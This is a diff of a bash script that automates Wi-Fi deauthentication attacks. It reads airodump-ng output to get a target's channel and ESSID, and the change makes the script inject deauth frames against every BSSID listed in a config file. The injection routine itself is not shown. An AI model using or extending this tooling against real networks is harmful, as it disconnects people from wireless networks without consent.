@@ -72,22 +72,21 @@ function main(){
 	# if target channel can't be found, just exit the script
 	if [ -z "$TARGET_CHANNEL" ]; then
 		echo "Target BSSID not found. Exiting."
-		exit 1
-	fi
+	else
+		# filter out more than two chars of the channel result, may caused by station section of the airodump-ng output
+		TARGET_CHANNEL="${TARGET_CHANNEL:0:2}"
 
-	# filter out more than two chars of the channel result, may caused by station section of the airodump-ng output
-	TARGET_CHANNEL="${TARGET_CHANNEL:0:2}"
+		# determine ESSID for informational purpose only
+		TARGET_ESSID=$(parse $TARGET_BSSID 14)
 
-	# determine ESSID for informational purpose only
-	TARGET_ESSID=$(parse $TARGET_BSSID 14)
+		echo "Automated channel targeting..."
+		echo "Target ESSID = $TARGET_ESSID"
+		echo "Target BSSID = $TARGET_BSSID"
+		echo "Target channel = $TARGET_CHANNEL"
+		echo "Injecting deAuth frame for $INJECTION_TIME second(s)"
 
-	echo "Automated channel targeting..."
-	echo "Target ESSID = $TARGET_ESSID"
-	echo "Target BSSID = $TARGET_BSSID"
-	echo "Target channel = $TARGET_CHANNEL"
-	echo "Injecting deAuth frame for $INJECTION_TIME second(s)"
-
-	exec_deauth $IFACE $TARGET_CHANNEL $TARGET_BSSID $INJECTION_TIME $TARGET_DEVICE
+		exec_deauth $IFACE $TARGET_CHANNEL $TARGET_BSSID $INJECTION_TIME $TARGET_DEVICE
+	fi	
 }
 
 # initial
@@ -108,10 +107,10 @@ if [ "$MULTI_BSSID" -eq 1 ]; then
 		fi
 	done < "config.cfg"
 
-	for value in "${MULTI_TARGET_BSSID[@]}"; do
-		echo "TARGET_BSSID: $value"
+	for CURRENT_TARGET_BSSID in "${MULTI_TARGET_BSSID[@]}"; do
+		echo "Current target BSSID = $CURRENT_TARGET_BSSID"
+		main $IFACE $CURRENT_TARGET_BSSID $INJECTION_TIME $TARGET_DEVICE
 	done
-	exit 1
 else
 	echo "Normal mode"
 	main $IFACE $TARGET_BSSID $INJECTION_TIME $TARGET_DEVICE
